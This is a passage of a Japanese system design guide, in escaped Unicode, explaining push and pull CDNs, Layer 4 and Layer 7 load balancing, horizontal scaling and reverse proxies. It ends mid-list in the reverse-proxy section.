\u30d7\u30c3\u30b7\u30e5CDN\n\n\u30d7\u30c3\u30b7\u30e5CDN\u3067\u306f\u30b5\u30fc\u30d0\u30fc\u30c7\u30fc\u30bf\u306b\u66f4\u65b0\u304c\u3042\u3063\u305f\u6642\u306b\u306f\u5fc5\u305a\u3001\u65b0\u3057\u3044\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u53d7\u3051\u53d6\u308b\u65b9\u5f0f\u3067\u3059\u3002\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u7528\u610f\u3057\u3001CDN\u306b\u76f4\u63a5\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u3001URL\u3092CDN\u3092\u6307\u3059\u3088\u3046\u306b\u6307\u5b9a\u3059\u308b\u3068\u3053\u308d\u307e\u3067\u3001\u5168\u3066\u81ea\u5206\u3067\u8cac\u4efb\u3092\u8ca0\u3046\u5f62\u3067\u3059\u3002\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u3044\u3064\u671f\u9650\u5207\u308c\u306b\u306a\u308b\u306e\u304b\u66f4\u65b0\u3055\u308c\u308b\u306e\u304b\u3092\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u30b3\u30f3\u30c6\u30f3\u30c4\u306f\u65b0\u898f\u4f5c\u6210\u6642\u3001\u66f4\u65b0\u6642\u306e\u307f\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3055\u308c\u308b\u3053\u3068\u3067\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306f\u6700\u5c0f\u5316\u3055\u308c\u308b\u4e00\u65b9\u3001\u30b9\u30c8\u30ec\u30fc\u30b8\u306f\u6700\u5927\u9650\u6d88\u8cbb\u3055\u308c\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n\n\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306e\u5c11\u306a\u3044\u3001\u3082\u3057\u304f\u306f\u983b\u7e41\u306b\u306f\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u66f4\u65b0\u3055\u308c\u306a\u3044\u30b5\u30a4\u30c8\u306e\u5834\u5408\u306b\u306f\u30d7\u30c3\u30b7\u30e5CDN\u3068\u76f8\u6027\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\u30b3\u30f3\u30c6\u30f3\u30c4\u306f\u5b9a\u671f\u7684\u306b\u518d\u3073\u30d7\u30eb\u3055\u308c\u308b\u306e\u3067\u306f\u306a\u304f\u3001CDN\u306b\u4e00\u5ea6\u306e\u307f\u914d\u7f6e\u3055\u308c\u307e\u3059\u3002\n\n### \u30d7\u30ebCDN\n\n\u30d7\u30ebCDN\u3067\u306f\u4e00\u4eba\u76ee\u306e\u30e6\u30fc\u30b6\u30fc\u304c\u30ea\u30af\u30a8\u30b9\u30c8\u3057\u305f\u6642\u306b\u3001\u65b0\u3057\u3044\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u30b5\u30fc\u30d3\u30b9\u306e\u30b5\u30fc\u30d0\u30fc\u304b\u3089\u53d6\u5f97\u3057\u307e\u3059\u3002\u30b3\u30f3\u30c6\u30f3\u30c4\u306f\u81ea\u5206\u306e\u30b5\u30fc\u30d0\u30fc\u306b\u4fdd\u5b58\u3057\u3066\u3001CDN\u3092\u6307\u3059URL\u3092\u66f8\u304d\u63db\u3048\u307e\u3059\u3002\u7d50\u679c\u3068\u3057\u3066\u3001CDN\u306b\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u308b\u307e\u3067\u306f\u30ea\u30af\u30a8\u30b9\u30c8\u51e6\u7406\u304c\u9045\u304f\u306a\u308a\u307e\u3059\u3002\n\n[time-to-live (TTL)](https:\/\/en.wikipedia.org\/wiki\/Time_to_live) \u306f\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u3069\u308c\u3060\u3051\u306e\u671f\u9593\u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u308b\u304b\u3092\u898f\u5b9a\u3057\u307e\u3059\u3002\u30d7\u30ebCDN\u306fCDN \u4e0a\u3067\u306e\u30b9\u30c8\u30ec\u30fc\u30b8\u30b9\u30da\u30fc\u30b9\u3092\u6700\u5c0f\u5316\u3057\u307e\u3059\u304c\u3001\u6709\u52b9\u671f\u9650\u304c\u5207\u308c\u305f\u30d5\u30a1\u30a4\u30eb\u304c\u66f4\u65b0\u524d\u306b\u30d7\u30eb\u3055\u308c\u3066\u3057\u307e\u3046\u3053\u3068\u3067\u5197\u9577\u306a\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306b\u7e4b\u304c\u3063\u3066\u3057\u307e\u3046\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\n\u5927\u898f\u6a21\u306a\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306e\u3042\u308b\u30b5\u30a4\u30c8\u3067\u306f\u30d7\u30ebCDN\u304c\u76f8\u6027\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\u3068\u3044\u3046\u306e\u3082\u3001\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306e\u5927\u90e8\u5206\u306f\u6700\u8fd1\u30ea\u30af\u30a8\u30b9\u30c8\u3055\u308c\u3001CDN\u306b\u6b8b\u3063\u3066\u3044\u308b\u30b3\u30f3\u30c6\u30f3\u30c4\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3082\u306e\u3067\u3042\u308b\u3053\u3068\u304c\u591a\u3044\u304b\u3089\u3067\u3059\u3002\n\n### \u6b20\u70b9: CDN\n\n* CDN\u306e\u30b3\u30b9\u30c8\u306f\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u91cf\u306b\u3088\u3063\u3066\u5909\u308f\u308a\u307e\u3059\u3002\u3082\u3061\u308d\u3093\u3001CDN\u3092\u4f7f\u308f\u306a\u3044\u5834\u5408\u306e\u30b3\u30b9\u30c8\u3068\u6bd4\u8f03\u3059\u308b\u3079\u304d\u3067\u3057\u3087\u3046\u3002\n* TTL\u304c\u5207\u308c\u308b\u524d\u306b\u30b3\u30f3\u30c6\u30f3\u30c4\u304c\u66f4\u65b0\u3055\u308c\u308b\u3068\u9673\u8150\u5316\u3059\u308b\u6050\u308c\u304c\u3042\u308a\u307e\u3059\u3002\n* CDN\u3067\u306f\u9759\u7684\u30b3\u30f3\u30c6\u30f3\u30c4\u304cCDN\u3092\u6307\u3059\u3088\u3046\u306bURL\u3092\u66f4\u65b0\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30b0\u30ed\u30fc\u30d0\u30eb\u306b\u5206\u6563\u3055\u308c\u305f\u30b3\u30f3\u30c6\u30f3\u30c4\u30c7\u30ea\u30d0\u30ea\u30fc\u30cd\u30c3\u30c8\u30ef\u30fc\u30af](http:\/\/repository.cmu.edu\/cgi\/viewcontent.cgi?article=2112&context=compsci)\n* [\u30d7\u30c3\u30b7\u30e5CDN\u3068\u30d7\u30ebCDN\u306e\u9055\u3044](http:\/\/www.travelblogadvice.com\/technical\/the-differences-between-push-and-pull-cdns\/)\n* [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Content_delivery_network)\n\n## \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/h81n9iK.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/horicky.blogspot.com\/2010\/10\/scalable-system-design-patterns.html>Source: Scalable system design patterns<\/a><\/i>\n<\/p>\n\n\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u5165\u529b\u3055\u308c\u308b\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30b5\u30fc\u30d0\u30fc\u3084\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3078\u3068\u5206\u6563\u3055\u305b\u308b\u3002\u3069\u306e\u30b1\u30fc\u30b9\u3067\u3082\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u30b5\u30fc\u30d0\u30fc\u7b49\u8a08\u7b97\u30ea\u30bd\u30fc\u30b9\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u9069\u5207\u306a\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306b\u8fd4\u3059\u3002\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u4ee5\u4e0b\u306e\u3053\u3068\u306b\u52b9\u679c\u7684\u3067\u3059:\n\n* \u30ea\u30af\u30a8\u30b9\u30c8\u304c\u72b6\u614b\u306e\u826f\u304f\u306a\u3044\u30b5\u30fc\u30d0\u30fc\u306b\u884c\u304f\u306e\u3092\u9632\u3050\n* \u30ea\u30af\u30a8\u30b9\u30c8\u3092\u904e\u5270\u306b\u9001\u308b\u306e\u3092\u9632\u3050\n* \u7279\u5b9a\u7b87\u6240\u306e\u6b20\u9665\u3067\u30b5\u30fc\u30d3\u30b9\u304c\u843d\u3061\u308b\u3053\u3068\u3092\u9632\u3050\n\n\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f (\u8cbb\u7528\u306e\u9ad8\u3044) \u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u3082\u3057\u304f\u306fHAProxy\u306a\u3069\u306e\u30bd\u30d5\u30c8\u30a6\u30a7\u30a2\u3067\u5b9f\u73fe\u3067\u304d\u308b\u3002\n\n\u4ed6\u306e\u5229\u70b9\u3068\u3057\u3066\u306f:\n\n* **SSL termination** - \u5165\u529b\u3055\u308c\u308b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u89e3\u8aad\u3059\u308b\u3001\u307e\u305f\u3001\u30b5\u30fc\u30d0\u30fc\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u6697\u53f7\u5316\u3059\u308b\u3053\u3068\u3067\u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u306e\u30b5\u30fc\u30d0\u30fc\u304c\u3053\u306e\u30b3\u30b9\u30c8\u304c\u9ad8\u304f\u3064\u304d\u304c\u3061\u306a\u51e6\u7406\u3092\u8acb\u3051\u8ca0\u308f\u306a\u304f\u3066\u3044\u3044\u3088\u3046\u306b\u80a9\u4ee3\u308f\u308a\u3057\u307e\u3059\u3002\n    * [X.509 certificates](https:\/\/en.wikipedia.org\/wiki\/X.509) \u3092\u305d\u308c\u305e\u308c\u306e\u30b5\u30fc\u30d0\u30fc\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3059\u308b\u5fc5\u8981\u3092\u306a\u304f\u3057\u307e\u3059\n* **\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406** - \u30af\u30c3\u30ad\u30fc\u3092\u53d6\u308a\u6271\u3046\u30a6\u30a7\u30d6\u30a2\u30d7\u30ea\u304c\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u3092\u4fdd\u6301\u3057\u3066\u3044\u306a\u3044\u6642\u306a\u3069\u306b\u3001\u7279\u5b9a\u306e\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u540c\u3058\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3078\u3068\u6d41\u3057\u307e\u3059\u3002\n\n\u969c\u5bb3\u306b\u5bfe\u5fdc\u3059\u308b\u305f\u3081\u306b\u3001[\u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30d1\u30c3\u30b7\u30d6](#\u30a2\u30af\u30c6\u30a3\u30d6\u30d1\u30c3\u30b7\u30d6) \u3082\u3057\u304f\u306f [\u30a2\u30af\u30c6\u30a3\u30d6\u30fb\u30a2\u30af\u30c6\u30a3\u30d6](#\u30a2\u30af\u30c6\u30a3\u30d6\u30a2\u30af\u30c6\u30a3\u30d6) \u30e2\u30fc\u30c9\u306e\u3069\u3061\u3089\u306b\u304a\u3044\u3066\u3082\u3001\u8907\u6570\u306e\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3092\u914d\u7f6e\u3059\u308b\u306e\u304c\u4e00\u822c\u7684\u3067\u3059\u3002\n\n\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u7a2e\u3005\u306e\u30e1\u30c8\u30ea\u30c3\u30af\u3092\u7528\u3044\u3066\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u30eb\u30fc\u30c6\u30a3\u30f3\u30b0\u3092\u884c\u3046\u3053\u3068\u304c\u3067\u304d\u307e\u3059:\n\n* \u30e9\u30f3\u30c0\u30e0\n* Least loaded\n* \u30bb\u30c3\u30b7\u30e7\u30f3\/\u30af\u30c3\u30ad\u30fc\n* [\u30e9\u30a6\u30f3\u30c9\u30ed\u30d3\u30f3\u3082\u3057\u304f\u306f\u52a0\u91cd\u30e9\u30a6\u30f3\u30c9\u30ed\u30d3\u30f3](http:\/\/g33kinfo.com\/info\/archives\/2657)\n* [Layer 4](#layer-4-\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0)\n* [Layer 7](#layer-7-\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0)\n\n### Layer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0\n\nLayer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f [\u30c8\u30e9\u30f3\u30b9\u30dd\u30fc\u30c8\u30ec\u30a4\u30e4\u30fc](#\u901a\u4fe1) \u3092\u53c2\u7167\u3057\u3066\u3069\u306e\u3088\u3046\u306b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u914d\u5206\u3059\u308b\u304b\u5224\u65ad\u3057\u307e\u3059\u3002\u4e00\u822c\u7684\u306b\u3001\u30c8\u30e9\u30f3\u30b9\u30dd\u30fc\u30c8\u30ec\u30a4\u30e4\u30fc\u3068\u3057\u3066\u306f\u3001\u30bd\u30fc\u30b9\u3001\u9001\u4fe1\u5148IP\u30a2\u30c9\u30ec\u30b9\u3001\u30d8\u30c3\u30c0\u30fc\u306b\u8a18\u8ff0\u3055\u308c\u305f\u30dd\u30fc\u30c8\u756a\u53f7\u304c\u542b\u307e\u308c\u307e\u3059\u304c\u3001\u30d1\u30b1\u30c3\u30c8\u306e\u4e2d\u8eab\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u306f\u542b\u307f\u307e\u305b\u3093\u3002 Layer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u30d1\u30b1\u30c3\u30c8\u3092\u4e0a\u6d41\u30b5\u30fc\u30d0\u30fc\u3078\u5c4a\u3051\u3001\u4e0a\u6d41\u30b5\u30fc\u30d0\u30fc\u304b\u3089\u914d\u4fe1\u3059\u308b\u3053\u3068\u3067\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u30a2\u30c9\u30ec\u30b9\u5909\u63db [Network Address Translation (NAT)](https:\/\/www.nginx.com\/resources\/glossary\/layer-4-load-balancing\/) \u3092\u5b9f\u73fe\u3057\u307e\u3059\u3002\n\n### Layer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0\n\nLayer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f [\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ec\u30a4\u30e4\u30fc](#\u901a\u4fe1) \u3092\u53c2\u7167\u3057\u3066\u3069\u306e\u3088\u3046\u306b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u914d\u5206\u3059\u308b\u304b\u5224\u65ad\u3057\u307e\u3059\u3002\u30d8\u30c3\u30c0\u30fc\u3001\u30e1\u30c3\u30bb\u30fc\u30b8\u3001\u30af\u30c3\u30ad\u30fc\u306a\u3069\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u306e\u3053\u3068\u3067\u3059\u3002Layer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u306e\u7d42\u7aef\u3092\u53d7\u3051\u6301\u3061 \u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u8aad\u307f\u8fbc\u307f\u3001\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0\u306e\u5224\u65ad\u3092\u3057\u3001\u9078\u629e\u3057\u305f\u30b5\u30fc\u30d0\u30fc\u3068\u306e\u63a5\u7d9a\u3092\u7e4b\u304e\u307e\u3059\u3002\u4f8b\u3048\u3070 layer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u52d5\u753b\u306e\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u76f4\u63a5\u3001\u305d\u306e\u30c7\u30fc\u30bf\u3092\u30db\u30b9\u30c8\u3057\u3066\u3044\u308b\u30b5\u30fc\u30d0\u30fc\u306b\u3064\u306a\u3050\u3068\u540c\u6642\u306b\u3001\u6c7a\u6e08\u51e6\u7406\u306a\u3069\u306e\u3088\u308a\u7e4a\u7d30\u306a\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5f37\u5316\u3055\u308c\u305f\u30b5\u30fc\u30d0\u30fc\u306b\u6d41\u3059\u3068\u3044\u3046\u3053\u3068\u3082\u3067\u304d\u308b\u3002\n\n\u67d4\u8edf\u6027\u3068\u306e\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306b\u306a\u308a\u307e\u3059\u304c\u3001 layer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3067\u306fLayer 7\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3088\u308a\u3082\u6240\u8981\u6642\u9593\u3001\u8a08\u7b97\u30ea\u30bd\u30fc\u30b9\u3092\u5c11\u306a\u304f\u6e08\u307e\u305b\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u305f\u3060\u3057\u3001\u6628\u4eca\u306e\u6c4e\u7528\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u3067\u306f\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u306f\u6700\u5c0f\u9650\u306e\u307f\u3057\u304b\u767a\u63ee\u3067\u304d\u306a\u3044\u3067\u3057\u3087\u3046\u3002\n\n### \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\n\n\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3067\u306f\u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u306b\u3088\u3063\u3066\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3068\u53ef\u7528\u6027\u3092\u5411\u4e0a\u3055\u305b\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u624b\u9803\u306a\u6c4e\u7528\u30de\u30b7\u30f3\u3092\u8ffd\u52a0\u3059\u308b\u3053\u3068\u306b\u3088\u3063\u3066\u30b9\u30b1\u30fc\u30eb\u30a2\u30a6\u30c8\u3055\u305b\u308b\u65b9\u304c\u3001\u4e00\u3064\u306e\u30b5\u30fc\u30d0\u30fc\u3092\u3088\u308a\u9ad8\u4fa1\u306a\u30de\u30b7\u30f3\u306b\u30b9\u30b1\u30fc\u30eb\u30a2\u30c3\u30d7\u3059\u308b\uff08**\u5782\u76f4\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0**\uff09\u3088\u308a\u8cbb\u7528\u5bfe\u52b9\u679c\u3082\u9ad8\u304f\u306a\u308a\u3001\u7d50\u679c\u7684\u306b\u53ef\u7528\u6027\u3082\u9ad8\u304f\u306a\u308a\u307e\u3059\u3002\u307e\u305f\u3001\u6c4e\u7528\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u3092\u6271\u3048\u308b\u4eba\u6750\u3092\u96c7\u3046\u65b9\u304c\u3001\u7279\u5316\u578b\u306e\u5546\u7528\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u3092\u6271\u3048\u308b\u4eba\u6750\u3092\u96c7\u3046\u3088\u308a\u3082\u7c21\u5358\u3067\u3057\u3087\u3046\u3002\n\n#### \u6b20\u70b9: \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\n\n* \u6c34\u5e73\u7684\u306b\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u3057\u3066\u3044\u304f\u3068\u3001\u8907\u96d1\u3055\u304c\u5897\u3059\u4e0a\u306b\u3001\u30b5\u30fc\u30d0\u30fc\u306e\u30af\u30ed\u30fc\u30cb\u30f3\u30b0\u304c\u5fc5\u8981\u306b\u306a\u308b\u3002\n    * \u30b5\u30fc\u30d0\u30fc\u306f\u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u3067\u3042\u308b\u5fc5\u8981\u304c\u3042\u308b: \u30e6\u30fc\u30b6\u30fc\u306b\u95a2\u9023\u3059\u308b\u30bb\u30c3\u30b7\u30e7\u30f3\u3084\u3001\u30d7\u30ed\u30d5\u30a3\u30fc\u30eb\u5199\u771f\u306a\u3069\u306e\u30c7\u30fc\u30bf\u3092\u6301\u3063\u3066\u306f\u3044\u3051\u306a\u3044\n    * \u30bb\u30c3\u30b7\u30e7\u30f3\u306f\u4e00\u5143\u7684\u306a[\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](#\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9) (SQL\u3001 NoSQL)\u306a\u3069\u306e\u30c7\u30fc\u30bf\u30b9\u30c8\u30a2\u306b\u30b9\u30c8\u30a2\u3055\u308c\u308b\u304b [\u30ad\u30e3\u30c3\u30b7\u30e5](#\u30ad\u30e3\u30c3\u30b7\u30e5) (Redis\u3001 Memcached)\u306b\u6b8b\u3059\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n* \u30ad\u30e3\u30c3\u30b7\u30e5\u3084\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306a\u3069\u306e\u4e0b\u6d41\u30b5\u30fc\u30d0\u30fc\u306f\u4e0a\u6d41\u30b5\u30fc\u30d0\u30fc\u304c\u30b9\u30b1\u30fc\u30eb\u30a2\u30a6\u30c8\u3059\u308b\u306b\u3064\u308c\u3066\u3088\u308a\u591a\u304f\u306e\u540c\u6642\u63a5\u7d9a\u3092\u4fdd\u305f\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\n\n### \u6b20\u70b9: \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\n\n* \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u30ea\u30bd\u30fc\u30b9\u304c\u4e0d\u8db3\u3057\u3066\u3044\u305f\u308a\u3001\u8a2d\u5b9a\u304c\u9069\u5207\u3067\u306a\u3044\u5834\u5408\u3001\u30b7\u30b9\u30c6\u30e0\u5168\u4f53\u306e\u30dc\u30c8\u30eb\u30cd\u30c3\u30af\u306b\u306a\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n* \u5358\u4e00\u969c\u5bb3\u70b9\u3092\u9664\u3053\u3046\u3068\u3057\u3066\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3092\u5c0e\u5165\u3057\u305f\u7d50\u679c\u3001\u8907\u96d1\u3055\u304c\u5897\u3057\u3066\u3057\u307e\u3046\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n* \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u304c\u4e00\u3064\u3060\u3051\u3060\u3068\u305d\u3053\u304c\u5358\u4e00\u969c\u5bb3\u70b9\u306b\u306a\u3063\u3066\u3057\u307e\u3044\u307e\u3059\u3002\u4e00\u65b9\u3067\u3001\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3092\u8907\u6570\u306b\u3059\u308b\u3068\u3001\u3055\u3089\u306b\u8907\u96d1\u3055\u304c\u5897\u3057\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [NGINX \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.nginx.com\/blog\/inside-nginx-how-we-designed-for-performance-scale\/)\n* [HAProxy \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30ac\u30a4\u30c9](http:\/\/www.haproxy.org\/download\/1.2\/doc\/architecture.txt)\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3](http:\/\/www.lecloud.net\/post\/7295452622\/scalability-for-dummies-part-1-clones)\n* [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Load_balancing_(computing))\n* [Layer 4 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0](https:\/\/www.nginx.com\/resources\/glossary\/layer-4-load-balancing\/)\n* [Layer 7 \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0](https:\/\/www.nginx.com\/resources\/glossary\/layer-7-load-balancing\/)\n* [ELB listener config](http:\/\/docs.aws.amazon.com\/elasticloadbalancing\/latest\/classic\/elb-listener-config.html)\n\n## \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7(web\u30b5\u30fc\u30d0\u30fc)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/n41Azff.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/upload.wikimedia.org\/wikipedia\/commons\/6\/67\/Reverse_proxy_h2g2bob.svg>Source: Wikipedia<\/a><\/i>\n  <br\/>\n<\/p>\n\n\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u30b5\u30fc\u30d0\u30fc\u306f\u5185\u90e8\u30b5\u30fc\u30d3\u30b9\u3092\u307e\u3068\u3081\u3066\u5916\u90e8\u306b\u7d71\u4e00\u3055\u308c\u305f\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30fc\u30b9\u3092\u63d0\u4f9b\u3059\u308b\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u3067\u3059\u3002\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304b\u3089\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u306f\u305d\u308c\u306b\u5bfe\u5fdc\u3059\u308b\u30b5\u30fc\u30d0\u30fc\u306b\u9001\u3089\u308c\u3066\u3001\u305d\u306e\u5f8c\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u304c\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306b\u8fd4\u3057\u307e\u3059\u3002\n\n\u4ed6\u306b\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u5229\u70b9\u304c\u3042\u308a\u307e\u3059:\n\n* **\u3088\u308a\u5805\u7262\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3** - \u30d0\u30c3\u30af\u30a8\u30f3\u30c9\u30b5\u30fc\u30d0\u30fc\u306e\u60c5\u5831\u3092\u96a0\u3057\u305f\u308a\u3001IP\u30a2\u30c9\u30ec\u30b9\u3092\u30d6\u30e9\u30c3\u30af\u30ea\u30b9\u30c8\u5316\u3057\u305f\u308a\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u3054\u3068\u306e\u63a5\u7d9a\u6570\u3092\u5236\u9650\u3057\u305f\u308a\u3067\u304d\u307e\u3059\u3002\n* **\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3084\u67d4\u8edf\u6027\u304c\u5897\u3057\u307e\u3059** - \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u306eIP\u3057\u304b\u898b\u306a\u3044\u306e\u3067\u3001\u88cf\u3067\u30b5\u30fc\u30d0\u30fc\u3092\u30b9\u30b1\u30fc\u30eb\u3057\u305f\u308a\u3001\u8a2d\u5b9a\u3092\u5909\u3048\u3084\u3059\u304f\u306a\u308a\u307e\u3059\u3002\n* **SSL termination** - \u5165\u529b\u3055\u308c\u308b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u89e3\u8aad\u3057\u3001\u30b5\u30fc\u30d0\u30fc\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u6697\u53f7\u5316\u3059\u308b\u3053\u3068\u3067\u30b5\u30fc\u30d0\u30fc\u304c\u3053\u306e\u30b3\u30b9\u30c8\u306e\u304b\u304b\u308a\u3046\u308b\u51e6\u7406\u3092\u3057\u306a\u304f\u3066\u6e08\u3080\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\n    * [X.509 \u8a3c\u660e\u66f8](https:\/\/en.wikipedia.org\/wiki\/X.509) 